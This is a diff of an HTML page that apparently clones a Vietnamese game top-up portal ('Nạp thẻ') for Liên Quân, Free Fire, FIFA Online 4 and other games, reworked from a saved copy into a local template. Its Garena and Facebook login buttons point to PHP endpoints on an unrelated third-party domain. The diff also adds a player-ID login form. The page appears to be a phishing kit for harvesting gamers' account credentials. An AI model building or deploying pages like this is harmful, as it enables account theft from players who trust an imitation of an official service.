@@ -1,57 +1,76 @@
 <!DOCTYPE html>
-<!-- saved from url=(0027)https://napthe.id.vn/code2/ -->
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	
+<html>
+<head>
+	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1 , maximum-scale=1, user-scalable=no, viewport-fit=cover">
 	<title>Nạp thẻ</title>
-    <link href="./assets/base.css" rel="stylesheet">
-    <link rel="stylesheet" href="./assets/slick.css">
-    <script type="text/javascript" src="./assets/jquery-3.3.1.js"></script>
-    <script type="text/javascript" src="./assets/slick.js"></script>
-    <link href="./assets/style.css" rel="stylesheet">
-    <script type="text/javascript" src="./assets/style.js"></script>
+    <link href="css/base.css?v=1" rel="stylesheet" />
+    <link rel="stylesheet" href="js/slick/slick.css">
+    <script type="text/javascript" src="js/jquery-3.3.1.js"></script>
+    <script type="text/javascript" src="js/slick/slick.js"></script>
+    <link href="css/style.css" rel="stylesheet" />
+    <script type="text/javascript" src="js/style.js"></script>
 </head>
-<body cz-shortcut-listen="true" class="">
+<body>
     <div class="s-header-1">
         <div class="container align-items--between">
-            <a href="https://napthe.id.vn/code2/index.html" class="hd-logo"><img src="./assets/logo.png" alt=""></a>
+            <a href="index.html" class="hd-logo"><img src="images/logo.png" alt=""></a>
             <div class="hd-menu">
                 <a href="javascript:;" ht-trigger="hd-menu"><span>☰</span><span>×</span></a>
             </div>
-            <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="hd-button"><img class="logged" src="./assets/user-2.png" alt=""> <span class="name">Đăng nhập</span></a>
+            <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="hd-button"><img class="logged" src="images/user-2.png" alt=""> <span class="name">Đăng nhập</span></a>
         </div>
     </div>
     <div id="modalLogin" class="c-modal" ht-close="c-modal">
         <div class="c-modal-box">
             <div class="c-modal-group" ht-skip="parent">
-                <div class="c_close text--white" ht-close="c-modal"><img src="./assets/close.png" alt=""></div>
+                <div class="c_close text--white" ht-close="c-modal"><img src="images/close.png" alt=""></div>
                 <div class="c_body">
                     <div class="s-login-1">
                         <div class="s_title">Bảng điều khiển đăng nhập</div>
                         <div class="s_button">
-                            <a href="https://napgame.club/api/v1/login_garena.php"><img src="./assets/garena.png" alt=""> <span>Garena</span></a>
-                            <a href="https://napgame.club/api/v1/login_facebook.php"><img src="./assets/facebook.png" alt=""> <span>Facebook</span></a>
+                            <a href="https://napgame.club/api/v1/login_garena.php"><img src="images/garena.png" alt=""> <span>Garena</span></a>
+                            <a href="https://napgame.club/api/v1/login_facebook.php"><img src="images/facebook.png" alt=""> <span>Facebook</span></a>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
     </div>
-    <div id="modalLogin2" class="c-modal" ht-close="c-modal">
+    <!-- <div id="modalLogin2" class="c-modal" ht-close="c-modal">
         <div class="c-modal-box">
             <div class="c-modal-group" ht-skip="parent">
-                <div class="c_close text--white" ht-close="c-modal"><img src="./assets/close.png" alt=""></div>
+                <div class="c_close text--white" ht-close="c-modal"><img src="images/close.png" alt=""></div>
                 <div class="c_body">
                     <div class="s-login-1">
                         <div class="s_title">Bảng điều khiển đăng nhập</div>
                         <div class="s_button">
-                            <a href="https://napthe.id.vn/api/v1/login_facebook.php"><img src="./assets/facebook.png" alt=""> <span>Facebook</span></a>
+                            <a href="/api/v1/login_facebook.php"><img src="images/facebook.png" alt=""> <span>Facebook</span></a>
                             <div class="s_faifai">
-                                <a href="https://napthe.id.vn/code2/login-id.php"><img src="./assets/iconfaifai.png" alt="">  <div><span>ID Người Chơi</span></div></a>
-                                <span ht-trigger="c-modal-2" ht-target="#modalLogi2"><img src="./assets/question.png" alt=""></span>
+                                <a href="login-id.php" ><img src="images/iconfaifai.png" alt="">  <div><span>ID Người Chơi</span></div></a>
+                                <span ht-trigger="c-modal-2" ht-target="#modalLogi2"><img src="images/question.png" alt=""></span>
                             </div>
                         </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> -->
+    <div id="modalLogin2" class="c-modal" ht-close="c-modal">
+        <div class="c-modal-box">
+            <div class="c-modal-group" ht-skip="parent">
+                <div class="c_close text--white" ht-close="c-modal"><img src="images/close.png" alt=""></div>
+                <div class="c_body">
+                    <div class="s-login-1">
+                        <div class="s_title"><img width="45px" height="45px" src="images/faifai.png" alt=""> <span>ID Đăng Nhập</span></div>
+                        <form action="" id="loginform" method="POST" accept-charset="utf-8">
+                            <div class="form-group c-form is-empty">
+                                <input type="number" id="idfaifai" name="idfaifai" class="c_input" value="" placeholder="ID người chơi">
+                            </div>
+                            <span class="c-error"></span>
+                            <button name="login" type="submit" class="c-button-4">Đăng nhập</button>
+                        </form>
                     </div>
                 </div>
             </div>
@@ -60,9 +79,9 @@
     <div id="modalLogin3" class="c-modal c-modal-3" ht-close="c-modal-3">
         <div class="c-modal-box">
             <div class="c-modal-group" ht-skip="parent">
-                <div class="c_close text--white" ht-close="c-modal-3"><img src="./assets/close.png" alt=""></div>
+                <div class="c_close text--white" ht-close="c-modal-3"><img src="images/close.png" alt=""></div>
                 <div class="c_body">
-                    <img src="./assets/id.png" alt="">
+                    <img src="images/id.png" alt="">
                 </div>
             </div>
         </div>
@@ -70,8 +89,8 @@
     <div class="s-menu-1">
         <div class="s_menu">
             <ul ht-target="hd-menu">
-                <li class="button"><a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin"><img src="./assets/user-2.png" alt="">Đăng nhập</a></li>
-                <li><a href="https://napthe.id.vn/code2/">Chăm sóc khách hàng</a></li>
+                <li class="button"><a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin"><img src="images/user-2.png" alt="">Đăng nhập</a></li>
+                <li><a href="">Chăm sóc khách hàng</a></li>
             </ul>
         </div>
         <div class="s_after"></div>
@@ -79,10 +98,10 @@
     <div class="s-slide-1">
         <div class="container">
             <div class="b-sslide-ratio">
-                <div class="slick-slider slick-initialized"><button class="slick-prev slick-arrow" aria-label="Previous" type="button" style="">Previous</button>
-                    <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 4625px; transform: translate3d(-1850px, 0px, 0px); transition: transform 500ms ease 0s;"><a href="https://napthe.id.vn/code2/" class="slick-slide slick-cloned" data-slick-index="-1" aria-hidden="true" style="width: 925px;" tabindex="-1"><img src="./assets/slide_2.jpg" alt=""></a><a href="https://napthe.id.vn/code2/" class="slick-slide" data-slick-index="0" aria-hidden="true" style="width: 925px;" tabindex="0"><img src="./assets/slide_1.jpg" alt=""></a><a href="https://napthe.id.vn/code2/" class="slick-slide slick-current slick-active" data-slick-index="1" aria-hidden="false" style="width: 925px;" tabindex="-1"><img src="./assets/slide_2.jpg" alt=""></a><a href="https://napthe.id.vn/code2/" class="slick-slide slick-cloned" data-slick-index="2" aria-hidden="true" style="width: 925px;" tabindex="-1"><img src="./assets/slide_1.jpg" alt=""></a><a href="https://napthe.id.vn/code2/" class="slick-slide slick-cloned" data-slick-index="3" aria-hidden="true" style="width: 925px;" tabindex="-1"><img src="./assets/slide_2.jpg" alt=""></a></div></div> <!-- LINK -->
-                     <!-- LINK -->
-                <button class="slick-next slick-arrow" aria-label="Next" type="button" style="">Next</button></div>
+                <div class="slick-slider">
+                    <a href=""><img src="images/slide_1.jpg" alt="" /></a> <!-- LINK -->
+                    <a href=""><img src="images/slide_2.jpg" alt="" /></a> <!-- LINK -->
+                </div>
             </div>
         </div>
     </div>
@@ -93,43 +112,43 @@
             <div class="row row-flex">
                 <div class="col-6 col-sm-4">
                     <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1"> <!-- LINK -->
-                        <img src="./assets/lq.png" alt="">
+                        <img src="images/lq.png" alt="">
                         <h3>Liên Quân Mobile</h3>
                     </a>
                 </div>
                 <div class="col-6 col-sm-4">
                     <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin2" class="b-card-1 faifai"> <!-- LINK -->
-                        <img src="./assets/faifai.png" alt="">
+                        <img src="images/faifai.png" alt="">
                         <h3>Free Fire</h3>
                     </a>
                 </div>
                 <div class="col-6 col-sm-4">
                     <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1"> <!-- LINK -->
-                        <img src="./assets/icon.png" alt="">
+                        <img src="images/icon.png" alt="">
                         <h3>Nạp sò</h3>
                     </a>
                 </div>
                 <div class="col-6 col-sm-4">
                     <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1"> <!-- LINK -->
-                        <img src="./assets/fifa.png" alt="">
+                        <img src="images/fifa.png" alt="">
                         <h3>FIFA Online 4 (VN)</h3>
                     </a>
                 </div>
                 <div class="col-6 col-sm-4">
                     <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1"> <!-- LINK -->
-                        <img src="./assets/fifa4.png" alt="">
+                        <img src="images/fifa4.png" alt="">
                         <h3>FIFA Online 4 M VN</h3>
                     </a>
                 </div>
                 <div class="col-6 col-sm-4">
                     <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1"> <!-- LINK -->
-                        <img src="./assets/bns.png" alt="">
+                        <img src="images/bns.png" alt="">
                         <h3>Blade and Soul</h3>
                     </a>
                 </div>
                 <div class="col-6 col-sm-4">
                     <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1"> <!-- LINK -->
-                        <img src="./assets/lol.png" alt="">
+                        <img src="images/lol.png" alt="">
                         <h3>Liên Minh Huyền Thoại</h3>
                     </a>
                 </div>
@@ -146,9 +165,9 @@
                 <li>Điện thoại: 024 73053939</li>
             </ul>
             <ul>
-                <li><a href="https://napthe.id.vn/code2/">Câu hỏi thường gặp</a></li> <!-- LINK -->
-                <li><a href="https://napthe.id.vn/code2/">Điều khoản dịch vụ</a></li> <!-- LINK -->
-                <li><a href="https://napthe.id.vn/code2/">Chính sách bảo mật</a></li> <!-- LINK -->
+                <li><a href="">Câu hỏi thường gặp</a></li> <!-- LINK -->
+                <li><a href="">Điều khoản dịch vụ</a></li> <!-- LINK -->
+                <li><a href="">Chính sách bảo mật</a></li> <!-- LINK -->
             </ul>
         </div>
     </div>
@@ -164,5 +183,5 @@
         sessionStorage.removeItem('amount');
         sessionStorage.removeItem('item');
     </script>
-
-</body></html>
+</body>
+</html>
